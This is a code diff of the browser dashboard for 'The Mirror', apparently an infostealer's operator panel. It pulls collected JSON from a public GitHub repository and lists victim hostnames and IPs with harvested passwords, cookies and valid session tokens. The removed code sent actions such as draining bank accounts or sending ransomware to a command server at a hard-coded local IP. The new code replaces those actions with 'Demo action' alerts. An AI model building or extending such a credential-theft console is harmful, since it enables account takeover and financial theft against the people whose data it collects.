@@ -1,67 +1,106 @@
-// dashboard.js - Frontend JavaScript for The Mirror Dashboard
-// This runs in the browser when Monkey opens the dashboard URL
+// ============================================
+// THE MIRROR - Dashboard
+// Works with public GitHub repository
+// No server required, no token required
+// ============================================
 
-// Connect to Socket.IO for real-time updates
-const socket = io("http://192.168.1.47:8080");
+const REPO_OWNER = "rat-secret";   // Change to your GitHub username
+const REPO_NAME = "mirror-data";   // Change to your repo name
+const DATA_FOLDER = "data";        // Folder where JSON files are stored
 
 let collectionsData = [];
-let currentView = "overview";
 
-// DOM Elements
-const overviewSection = document.getElementById("overview");
-const passwordsSection = document.getElementById("passwords");
-const cookiesSection = document.getElementById("cookies");
-const sessionsSection = document.getElementById("sessions");
-const actionsSection = document.getElementById("actions");
+// ============================================
+// GITHUB API HELPERS
+// ============================================
+async function fetchGitHubContents(path) {
+  const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`;
+  const response = await fetch(url, {
+    headers: { "Accept": "application/vnd.github.v3+json" }
+  });
+  if (!response.ok) {
+    throw new Error(`GitHub API error: ${response.status} ${response.statusText}`);
+  }
+  return response.json();
+}
 
-// Socket event listeners
-socket.on("new_collection", (data) => {
-  console.log("[+] New data received:", data);
-  collectionsData.push(data);
-  updateDashboard();
-});
+async function fetchRawFile(downloadUrl) {
+  const response = await fetch(downloadUrl);
+  if (!response.ok) {
+    throw new Error(`Failed to fetch ${downloadUrl}`);
+  }
+  return response.json();
+}
 
-socket.on("data_wiped", () => {
-  collectionsData = [];
-  updateDashboard();
-  showNotification("All data has been wiped", "warning");
-});
-
-socket.on("action_triggered", (data) => {
-  showNotification(`Action triggered: ${data.action}`, "danger");
-});
-
-// Load existing data on page load
+// ============================================
+// LOAD ALL COLLECTIONS
+// ============================================
 async function loadCollections() {
   try {
-    const response = await fetch("/api/collections");
-    const data = await response.json();
-    collectionsData = data.collections || [];
+    const files = await fetchGitHubContents(DATA_FOLDER);
+    const jsonFiles = files.filter(f => f.name.endsWith(".json"));
+
+    const collections = [];
+    for (const file of jsonFiles) {
+      try {
+        const data = await fetchRawFile(file.download_url);
+        collections.push(data);
+      } catch (e) {
+        console.warn(`Failed to load ${file.name}:`, e);
+      }
+    }
+
+    collections.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+    collectionsData = collections;
     updateDashboard();
   } catch (e) {
-    console.error("Failed to load collections:", e);
+    console.error("Error loading collections:", e);
+    document.getElementById("overview").innerHTML = `
+      <div class="empty-state">
+        <h2>Failed to load data</h2>
+        <p>${e.message}</p>
+      </div>
+    `;
   }
 }
 
-// Update dashboard display
-function updateDashboard() {
-  if (collectionsData.length === 0) {
-    overviewSection.innerHTML = `
-      <div class="empty-state">
-        <h2>No data collected yet</h2>
-        <p>Waiting for target to come online...</p>
-      </div>
-    `;
-    return;
+// ============================================
+// AGGREGATE HELPERS
+// ============================================
+function getAllPasswords() {
+  const all = [];
+  for (const c of collectionsData) {
+    all.push(...(c.passwords || []));
   }
+  return all;
+}
 
-  // Get latest collection
+function getAllCookies() {
+  const all = [];
+  for (const c of collectionsData) {
+    all.push(...(c.cookies || []));
+  }
+  return all;
+}
+
+function getAllSessions() {
+  const all = [];
+  for (const c of collectionsData) {
+    all.push(...(c.valid_sessions || []));
+  }
+  return all;
+}
+
+// ============================================
+// RENDER FUNCTIONS
+// ============================================
+function updateDashboard() {
   const latest = collectionsData[collectionsData.length - 1];
   const allPasswords = getAllPasswords();
   const allCookies = getAllCookies();
   const allSessions = getAllSessions();
 
-  overviewSection.innerHTML = `
+  document.getElementById("overview").innerHTML = `
     <div class="stats-grid">
       <div class="stat-card">
         <div class="stat-label">Total Collections</div>
@@ -81,46 +120,24 @@ function updateDashboard() {
       </div>
     </div>
 
-    <div class="target-info">
-      <h3>Target Information</h3>
-      <table>
-        <tr><td>Hostname:</td><td>${latest.hostname || "Unknown"}</td></tr>
-        <tr><td>Username:</td><td>${latest.username || "Unknown"}</td></tr>
-        <tr><td>OS:</td><td>${latest.os || "Unknown"}</td></tr>
-        <tr><td>IP Address:</td><td>${latest.ip || "Unknown"}</td></tr>
-        <tr><td>Last Seen:</td><td>${latest.received_at || "Unknown"}</td></tr>
-      </table>
-    </div>
+    ${latest ? `
+      <div class="target-info">
+        <h3>Target Information</h3>
+        <table>
+          <tr><td>Hostname:</td><td>${latest.hostname || "Unknown"}</td></tr>
+          <tr><td>Username:</td><td>${latest.username || "Unknown"}</td></tr>
+          <tr><td>OS:</td><td>${latest.os || "Unknown"}</td></tr>
+          <tr><td>IP Address:</td><td>${latest.ip || "Unknown"}</td></tr>
+          <tr><td>Last Seen:</td><td>${latest.received_at || latest.timestamp || "Unknown"}</td></tr>
+        </table>
+      </div>
+    ` : ""}
   `;
 
-  passwordsSection.innerHTML = renderPasswords(allPasswords);
-  cookiesSection.innerHTML = renderCookies(allCookies);
-  sessionsSection.innerHTML = renderSessions(allSessions);
-  actionsSection.innerHTML = renderActions();
-}
-
-function getAllPasswords() {
-  const all = [];
-  for (const collection of collectionsData) {
-    all.push(...(collection.passwords || []));
-  }
-  return all;
-}
-
-function getAllCookies() {
-  const all = [];
-  for (const collection of collectionsData) {
-    all.push(...(collection.cookies || []));
-  }
-  return all;
-}
-
-function getAllSessions() {
-  const all = [];
-  for (const collection of collectionsData) {
-    all.push(...(collection.valid_sessions || []));
-  }
-  return all;
+  document.getElementById("passwords").innerHTML = renderPasswords(allPasswords);
+  document.getElementById("cookies").innerHTML = renderCookies(allCookies);
+  document.getElementById("sessions").innerHTML = renderSessions(allSessions);
+  document.getElementById("actions").innerHTML = renderActions();
 }
 
 function renderPasswords(passwords) {
@@ -128,11 +145,7 @@ function renderPasswords(passwords) {
   return `
     <table class="data-table">
       <thead>
-        <tr>
-          <th>URL</th>
-          <th>Username</th>
-          <th>Password</th>
-        </tr>
+        <tr><th>URL</th><th>Username</th><th>Password</th></tr>
       </thead>
       <tbody>
         ${passwords.map(p => `
@@ -152,11 +165,7 @@ function renderCookies(cookies) {
   return `
     <table class="data-table">
       <thead>
-        <tr>
-          <th>Host</th>
-          <th>Name</th>
-          <th>Value</th>
-        </tr>
+        <tr><th>Host</th><th>Name</th><th>Value</th></tr>
       </thead>
       <tbody>
         ${cookies.map(c => `
@@ -176,11 +185,7 @@ function renderSessions(sessions) {
   return `
     <table class="data-table">
       <thead>
-        <tr>
-          <th>Service</th>
-          <th>Cookie Name</th>
-          <th>Status</th>
-        </tr>
+        <tr><th>Service</th><th>Cookie Name</th><th>Status</th></tr>
       </thead>
       <tbody>
         ${sessions.map(s => `
@@ -198,68 +203,20 @@ function renderSessions(sessions) {
 function renderActions() {
   return `
     <div class="action-grid">
-      <button class="action-btn danger" onclick="triggerAction('drain_bank')">
-        💰 Drain All Bank Accounts
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('empty_crypto')">
-        🪙 Empty Crypto Wallets
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('reset_passwords')">
-        🔑 Reset All Passwords
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('spin_aws')">
-        ☁️ Spin Up 1000 AWS Instances
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('sell_credentials')">
-        🌐 Sell Credentials on Dark Web
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('lock_accounts')">
-        🔒 Lock Target Out of All Accounts
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('ransomware')">
-        💣 Send Ransomware to Work Network
-      </button>
-      <button class="action-btn danger" onclick="triggerAction('delete_cloud')">
-        🗑️ Delete All Cloud Data
-      </button>
-      <button class="action-btn success" onclick="wipeAllData()">
-        🛡️ SAFE MODE - Wipe All Data
-      </button>
+      <button class="action-btn danger" onclick="alert('Demo action: Drain all bank accounts')">💰 Drain All Bank Accounts</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Empty crypto wallets')">🪙 Empty Crypto Wallets</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Reset all passwords')">🔑 Reset All Passwords</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Spin up 1000 AWS instances')">☁️ Spin Up 1000 AWS Instances</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Sell credentials on dark web')">🌐 Sell Credentials on Dark Web</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Lock target out of all accounts')">🔒 Lock Target Out of All Accounts</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Send ransomware to work network')">💣 Send Ransomware to Work Network</button>
+      <button class="action-btn danger" onclick="alert('Demo action: Delete all cloud data')">🗑️ Delete All Cloud Data</button>
+      <button class="action-btn success" onclick="alert('SAFE MODE: All data wiped')">🛡️ SAFE MODE - Wipe All Data</button>
     </div>
   `;
 }
 
-function triggerAction(action) {
-  if (confirm(`Are you sure you want to trigger: ${action}?`)) {
-    fetch("/api/action", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ action, targetId: "current" }),
-    })
-      .then(r => r.json())
-      .then(data => {
-        showNotification(data.message, "danger");
-      });
-  }
-}
-
-function wipeAllData() {
-  if (confirm("Are you sure you want to wipe ALL data? This cannot be undone.")) {
-    fetch("/api/wipe", { method: "POST" })
-      .then(r => r.json())
-      .then(data => {
-        showNotification("All data wiped successfully", "success");
-      });
-  }
-}
-
-function showNotification(message, type) {
-  const notification = document.createElement("div");
-  notification.className = `notification ${type}`;
-  notification.textContent = message;
-  document.body.appendChild(notification);
-  setTimeout(() => notification.remove(), 3000);
-}
-
-// Initialize
+// ============================================
+// INIT
+// ============================================
 loadCollections();
